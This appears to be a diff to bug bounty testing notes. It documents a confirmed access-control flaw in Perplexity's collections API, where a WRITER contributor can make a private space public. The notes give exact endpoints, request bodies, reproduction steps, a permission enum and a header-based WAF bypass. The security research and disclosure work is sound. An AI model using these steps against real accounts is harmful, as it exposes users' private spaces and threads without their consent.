@@ -66,3 +66,33 @@ Billing:
 - [ ] Files/attachments IDOR
 - [ ] Connector tool execution authz
 - [ ] Billing/credit-limits authz
+
+---
+
+## FINDING #1 (CONFIRMED, end-to-end) — 2026-10-17
+### Space/Project: WRITER contributor can flip general access to PUBLIC_READ (broken access control)
+- Endpoint: `PUT /rest/collections/{collection_uuid}/access`
+- Body: `{"updated_access": 4}` (4 = PUBLIC_READ; 1 = RESTRICTED/private)
+- Preconditions: attacker is a contributor with `user_permission = 2` (WRITER) on the victim's PRIVATE space
+- Verified chain:
+  1. Owner (zeno0) owns private Space (access=1)
+  2. Owner shares with attacker (zeno0+org) via `POST /rest/collections/share` {"collection_uuid":..., "targets":[{"type":"email","email":...}]}
+  3. Attacker accepts (`POST /rest/collections/respond_to_invitation/{uuid}` {"accept":true})
+  4. Attacker (permission=2 WRITER, NOT owner) → `PUT /rest/collections/{uuid}/access` {"updated_access":4} → 200, access becomes 4
+  5. **Anonymous (no cookies) can now read the space + threads**: GET /rest/collections/get_collection?collection_uuid=...&collection_slug=... → 200 full data; GET /rest/collections/list_collection_threads → 200 thread list
+- Authorization inconsistency proves the bug: READER (permission=1) → GENERIC_FAILED (blocked); OWNER-only operation succeeds for WRITER(2)
+- Self permission escalation properly blocked (only READER/WRITER self-allowed, owner change forbidden)
+- remove_user, update_contributor_permission on others: properly 403 as WRITER
+- Thread variant (`POST /rest/thread/update_thread_access`): properly blocked ("CONTEXT NOT WRITABLE" without write token) — threads are hardened; spaces are not
+- Program relevance: "Modification of Enterprise Spaces or user content without proper authorization" + "Collaborative Enterprise Spaces" + Broken Access Control
+- NOTE: org-space (Enterprise Space) variant not yet verified — need a non-admin member account in an Enterprise org (both test accounts are ADMIN). User should verify via Burp with a MEMBER-role account.
+- All state restored to private (access=1) after tests.
+
+### Test-account permission enum (reverse-engineered)
+- collection user_permission: 1=READER, 2=WRITER, 4=OWNER (3=invalid in update; possibly EDITOR legacy)
+- general access: 1=RESTRICTED(private), 2=ORG_READ?, 3=ORG_WRITE?, 4=PUBLIC_READ (2,3 clamped server-side for non-admin flips; 4 accepted from WRITER — the bug)
+
+## Recon continuation notes (session 1)
+- GraphQL HTTP endpoint returns FORBIDDEN for everything incl __typename (WS-only; WS handshake 403 from non-browser TLS — user must test `wss://www.perplexity.ai/rest/perplexity_ask/graphql/ws?account=<uuid>` account-param trust in browser/Burp)
+- api.perplexity.ai OAuth: DCR open (client registered 201). Consent screen enforced. Test redirect_uri validation tricks in Burp.
+- Edge WAF bypass for /rest/*: Sec-Fetch-Dest/Mode/Site trio (any non-browser client). Bot mitigation only.
